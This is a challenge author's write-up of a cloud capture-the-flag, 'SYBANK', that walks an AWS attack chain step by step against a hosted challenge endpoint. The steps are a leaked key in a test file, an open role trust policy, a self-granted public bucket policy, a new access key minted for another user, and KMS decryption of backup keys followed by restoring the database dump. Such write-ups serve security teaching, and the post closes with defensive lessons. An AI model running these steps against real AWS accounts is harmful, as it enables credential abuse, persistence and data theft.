---
title: "PwnSec 2k26 - [Cloud] SYBANK"
date: 2026-09-13
draft: false
description: "The cloud challenge I wrote for PwnSec 2k26: a key leaked in a test file, a trust policy anyone could walk through, bucket-policy self-service, a forgotten Vim swap file, and RDS backups whose reader could also unwrap the key."
tags: ["ctf", "cloud", "aws"]
---

Most cloud challenges land in one of two buckets. Either the flag is sitting in a public S3 object and you're done in four minutes, or the path runs so deep into IAM trivia that nobody finishes. I wanted SYBANK somewhere in between: a chain where every link is a mistake I've seen in a real account, stacked until they add up to the whole database.

Six links. Break any one and the chain dies. That was the design goal, and it's also the lesson I wanted people to leave with.

Everything runs against a hosted AWS-compatible endpoint, so players set this once:

```bash
# export AWS_ENDPOINT_URL="https://localhost:8888"   # only if you're running LocalStack yourself
export AWS_ENDPOINT_URL="https://28abecb4e9659ba9.chal.ctf.ae"
```

With that exported, every `aws` command talks to the challenge instead of a real account. Skip it and the commands go to actual AWS and get denied, which is a confusing way to lose ten minutes.

## Link 1: the key in the test file

Players start with a company name and a person. No credentials, no endpoint access, nothing to authenticate with, so the opening move has to be OSINT.

The person's LinkedIn bio carries a username, `blvkrose`. Bios are where people leak handles without thinking about it, which is exactly why I put it there. Run the handle through sherlock and GitHub comes back:

```bash
sherlock blvkrose
```

The repo is public. The trap is *where* the credential lives: not in the application code, but in the tests.

```python
# tucked into one of the tests/test_*.py files
AWS_ACCESS_KEY_ID     = "AKIA................"
AWS_SECRET_ACCESS_KEY = "................................"
```

Somebody needed an integration test to actually talk to S3, hardcoded a real key "temporarily," and git kept it forever. This is link one because I've done a version of it myself. Never pushed it, thank god, but I've had a live key sitting in a local test file far longer than I'd like to admit. Tests are code. The repo is public. A string that looks like a credential is a credential to whoever reads it.

That's the foothold.

## Link 2: the trust policy anyone can walk through

First move with any AWS key:

```bash
aws configure                 # the leaked AKIA key + secret
aws sts get-caller-identity
```

`get-caller-identity` is the AWS equivalent of `whoami` and it can't be denied. A valid key hands back the account ID and exactly which principal you are. Here it resolves to a low-privilege dev identity, which is deliberately boring.

The interesting question with a boring identity is what it can turn into:

```bash
aws iam list-roles
```

`assumeRole-dba` shows up. Roles are only supposed to be assumable by the principals their trust policy names, and I wrote that trust policy wide open on purpose:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::000000000000:role/assumeRole-dba \
  --role-session-name dba
```

Back come temporary credentials: access key, secret, session token. Same account, bigger badge. Stash them as a profile so you can move between identities without losing track of which one you're holding:

```bash
aws configure --profile dba          # the assume-role output, session token included
aws sts get-caller-identity --profile dba
aws --profile dba s3 ls
```

Two buckets matter:

```bash
aws --profile dba s3 ls s3://sybank-dev-s3rdsbackupfiles   # encrypted RDS backups
aws --profile dba s3 ls s3://sybank-dev-s3filesharing      # has a .automation.sh.swp
```

## Link 3: bucket-policy self-service

That `.automation.sh.swp` is the piece I had the most fun planting. It's a Vim swap file. Open a file in Vim and it drops a hidden `.<name>.swp` beside it holding the buffer, so a leftover swap file is a snapshot of whatever someone was editing, usually including the plaintext the finished script was careful to hide.

dba can list that object but not `GetObject` it. That's the intended wall, and it's meant to look final for a moment.

It isn't, because dba holds `s3:PutBucketPolicy`. If you can't read the object but you can rewrite the bucket's resource policy, you grant yourself the read:

```bash
aws --profile dba s3api put-bucket-policy \
  --bucket sybank-dev-s3filesharing \
  --policy '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::sybank-dev-s3filesharing/*"
    }]
  }'
```

This is the link I most wanted people to remember. S3 access is identity policy OR resource policy, and either one is enough on its own. So `s3:PutBucketPolicy` isn't "can adjust a setting." It's "can read and write everything in this bucket," because whoever holds it writes themselves the permission. I've flagged this in a review and watched the room go quiet for a second. Yeah. That's it.

Pull the file:

```bash
aws --profile dba s3 cp s3://sybank-dev-s3filesharing/.automation.sh.swp .
```

`vim -r .automation.sh.swp` recovers it properly, though `strings` gets you to the useful part just as fast. The recovered script references a second IAM user, `dba-sec`, and dba is allowed to manage that user. No password needed, no existing key needed. Just mint a fresh one:

```bash
aws iam create-access-key --user-name dba-sec --profile dba
```

`iam:CreateAccessKey` on another user is total ownership of that user. You can always print yourself working credentials for them, which is why it shows up in so many persistence writeups.

## Link 4: the backup reader who can also unwrap the key

New key, new profile:

```bash
aws configure --profile sec
aws sts get-caller-identity --profile sec
```

`sec` is scoped tighter than dba. A plain `s3 ls` dies immediately:

```bash
aws --profile sec s3 ls                                       # AccessDenied
aws --profile sec s3 ls s3://sybank-dev-s3rdsbackupfiles      # this works though
```

That's least privilege working correctly, and I left it that way deliberately. sec only has rights on the backups bucket, which happens to be the bucket that matters.

Backups sit in timestamped folders, so list one and loop over it:

```bash
for i in $(aws --profile sec s3 ls s3://sybank-dev-s3rdsbackupfiles/dumps/20260912_194858/ | awk '{print $4}'); do
  aws --profile sec s3 cp s3://sybank-dev-s3rdsbackupfiles/dumps/20260912_194858/$i . ;
done
```

If nothing downloads here, check that the timestamp you listed matches the one you're copying from. Pointing those at two different folders produces silence rather than an error, and silence is miserable to debug.

Each folder holds three files:

- `sy_internal_<ts>.keyblob.b64`: the data key, itself encrypted by KMS, base64'd
- `sy_internal_<ts>.globals.sql.enc`: Postgres roles and users, OpenSSL-encrypted
- `sy_internal_<ts>.dump.enc`: the actual `pg_dump`, OpenSSL-encrypted

That's textbook envelope encryption, the same pattern AWS backups use. The data gets encrypted with a random symmetric key, that key gets wrapped by a KMS master key, and the wrapped blob is dropped next to the data. Reading anything means asking KMS to unwrap the key first.

Which is the whole point of this link: sec can read the backups, and sec can also call `kms:Decrypt`. The encryption buys the defender nothing, because the same identity holds both halves.

```bash
aws --profile sec kms decrypt \
  --ciphertext-blob file://sy_internal_20260911_161409.keyblob.b64
```

The `Plaintext` field comes back as `+vQ1WujEvTODEdX3QfVawyt4H1rJaRE59SdOkdLDI4U=`. That base64 string is the passphrase the dumps were encrypted with.

Decrypt both files with OpenSSL, matching how they were encrypted (AES-256-CBC, PBKDF2):

```bash
openssl enc -d -aes-256-cbc -pbkdf2 \
  -pass pass:+vQ1WujEvTODEdX3QfVawyt4H1rJaRE59SdOkdLDI4U= \
  -in sy_internal_20260911_161409.globals.sql.enc -out globals

openssl enc -d -aes-256-cbc -pbkdf2 \
  -pass pass:+vQ1WujEvTODEdX3QfVawyt4H1rJaRE59SdOkdLDI4U= \
  -in sy_internal_20260911_161409.dump.enc -out dump
```

Worth being clear about what's broken here: nothing, cryptographically. The algorithms are fine, the key wrapping is fine. The mistake is entirely in the permissions around the key, where one identity can both pull the encrypted backup and decrypt the key protecting it. Split those two grants and this link is dead.

sec can also read Secrets Manager, which holds the database connection details:

```bash
aws --profile sec secretsmanager list-secrets --region us-east-1
aws --profile sec secretsmanager get-secret-value --secret-id dbsec/database --region us-east-1
```

The secret name goes in `--secret-id` and `--region` stays a flag; getting that syntax backwards is a common way to waste a few minutes here.

## Link 5: restore it and read the flag

The dump is a standard `pg_dump` custom-format archive, so the intended finish is a throwaway Postgres container:

```bash
docker run -d \
  --name postgres \
  -e POSTGRES_PASSWORD=root \
  -p 5432:5432 \
  -v ./db:/tmp \
  postgres:latest
```

`-v ./db:/tmp` maps the local `./db` directory to `/tmp` inside the container, so `globals` and `dump` go in `./db` and land at `/tmp/globals` and `/tmp/dump`.

Restore in order. Globals first, since they create the roles the dump expects to own things; skip that and `pg_restore` produces a wall of "role does not exist" warnings.

```bash
docker exec -it postgres bash

psql -U postgres -f /tmp/globals          # roles/users first
createdb -U postgres sy_internal          # make the target DB
pg_restore -U postgres -d sy_internal --clean --if-exists /tmp/dump
psql -U postgres -d sy_internal           # poke around
```

From there it's plain SQL:

```sql
\dt
SELECT * FROM <the table that obviously holds it>;
```

The flag sits in one of the restored tables. `CTF{...}`.

## Why I built it this way

There's no clever single trick in SYBANK. It's six small, boring, entirely realistic mistakes stacked on each other:

1. A live key committed into a test file.
2. A role almost anyone could assume.
3. `s3:PutBucketPolicy` handed out as though it were harmless. It is not.
4. An editor swap file left in shared storage, plus `iam:CreateAccessKey` on another user.
5. The backup reader also holding `kms:Decrypt`.
6. A recoverable backup, which is just plaintext with extra steps.

Each one on its own gets waved through code review. Together they hand over the database.

That's the part I wanted players to sit with. You don't defend against "the attack," you defend each link: scan for secrets before they're pushed, scope trust policies to named principals, treat `PutBucketPolicy` and `CreateAccessKey` as the admin permissions they actually are, keep editor temp files out of shared buckets, and never let one identity both read a backup and unwrap its key.

Thanks to everyone who played it.
